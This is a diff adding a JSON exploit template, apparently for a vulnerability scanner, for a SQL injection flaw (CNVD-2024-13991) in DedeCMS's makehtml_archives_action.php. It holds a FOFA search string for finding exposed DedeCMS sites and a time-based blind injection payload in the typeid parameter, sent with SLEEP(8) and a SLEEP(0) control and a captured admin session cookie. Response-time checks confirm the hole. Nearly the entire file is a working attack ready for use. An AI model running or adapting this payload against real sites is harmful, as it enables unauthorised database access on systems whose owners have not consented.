@@ -1,0 +1,66 @@
+{
+  "product": "DedeCMS",
+  "vul_name": "DedeCMS makehtml_archives_action.php文件SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CNVD-2024-13991"
+  ],
+  "level": 3,
+  "vul_desc": "注入参数：typeid",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"dedecms\"\n"
+  },
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/dedecms/dede/makehtml_archives_action.php?typeid=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)",
+        "cookie": "menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; last_vtime=1707197362; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=fc3dc2a4ef75e66d; last_vid=sec%2Csec; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=06a2513292081902; lastCid=17; lastCid1BH21ANI1AGD297L1FF21LN02BGE1DNG=673119b845af569a; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=8b1d56792128e24d; DedeLoginTime=1707274662; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=346b5645435a6323; PHPSESSID=decfeerek8l7sh7860b17m4650; _csrf_name_386c7f53=f67a81cfb4242d5b1d3b3c1f8c2336e5; _csrf_name_386c7f531BH21ANI1AGD297L1FF21LN02BGE1DNG=bbefc5ce8b74e6b5"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/dedecms/dede/makehtml_archives_action.php?typeid=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(0)))a)",
+        "cookie": "menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; last_vtime=1707197362; last_vtime1BH21ANI1AGD297L1FF21LN02BGE1DNG=fc3dc2a4ef75e66d; last_vid=sec%2Csec; last_vid1BH21ANI1AGD297L1FF21LN02BGE1DNG=06a2513292081902; lastCid=17; lastCid1BH21ANI1AGD297L1FF21LN02BGE1DNG=673119b845af569a; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=8b1d56792128e24d; DedeLoginTime=1707274662; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=346b5645435a6323; PHPSESSID=decfeerek8l7sh7860b17m4650; _csrf_name_386c7f53=f67a81cfb4242d5b1d3b3c1f8c2336e5; _csrf_name_386c7f531BH21ANI1AGD297L1FF21LN02BGE1DNG=bbefc5ce8b74e6b5"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
